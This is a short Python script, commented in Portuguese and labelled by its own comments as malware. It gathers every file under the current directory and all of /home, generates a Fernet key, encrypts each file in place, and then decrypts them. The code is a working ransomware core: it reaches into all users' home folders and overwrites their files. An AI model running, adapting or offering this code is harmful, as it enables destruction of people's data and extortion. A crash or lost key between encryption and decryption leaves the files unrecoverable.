import os
from cryptography.fernet import Fernet
from pathlib import Path

# arquivos encontrados
files = list()

# pastas e subpastas encontradas
paths = list()


def generate_key():
    key = Fernet.generate_key()

    with open(f"{os.getcwd()}/chave.key", "wb") as chave:
        chave.write(key)


def look_paths_locate():
    cwd = os.getcwd()
    for dir in os.listdir():
        if (os.path.isfile(dir) == False):
            paths.append(cwd + "/" + dir)


def look_path_all():
    directory = "/home"
    for dir in os.listdir(directory):
        if (os.path.isfile(dir) == False):
            paths.append(directory + "/" + dir + "/")


def look_subpaths():
    for dir in paths:
        try:
            for path in os.listdir(dir):
                diretorio = Path(dir + "/" + path)
                if (diretorio.is_dir()):
                    paths.append(dir + "/" + path)

                    #print(dir)

        except PermissionError:
            continue
    

def look_files():
    #procura por arquivos nas pastas encontradas!
    
    for dir in paths:
        print(dir, ":")
        try:
            for file in os.listdir(dir):
                arq = Path(dir + "/" + file)
                if (arq.is_file()):
                    print("\t", dir + "/" + file)
                    files.append(dir + "/" + file)
        except PermissionError:
            print(">>>> ERROR: " + dir)
            continue


def encrypt_files():
    with open("chave.key", "rb") as chave:
        key = chave.read()


    for file in files:
        with open(file, "rb") as arquivo:
            conteudo = arquivo.read()

        conteudo_encrypted = Fernet(key).encrypt(conteudo)
        with open(file, "wb") as arquivo:
            arquivo.write(conteudo_encrypted)

def decrypt_files():
    with open("chave.key", "rb") as chave:
        key = chave.read()

    for file in files:
        with open(file, "rb") as arquivo:
            conteudo = arquivo.read()

        conteudo_decrypted = Fernet(key).decrypt(conteudo)
        with open(file, "wb") as arquivo:
            arquivo.write(conteudo_decrypted)


# busca as pastas onde o malware se encontra:
look_paths_locate()

#busca todas as pastas dentro da pasta home():
look_path_all()

#busca subpastas
look_subpaths()

#procura os arquivos dentro de pastas e subpastas
look_files()

#gera a chave para a criptografia
generate_key()

#criptografa os arquivos encontrados
encrypt_files()


#descriptografa os arquivos criptografados 
decrypt_files()

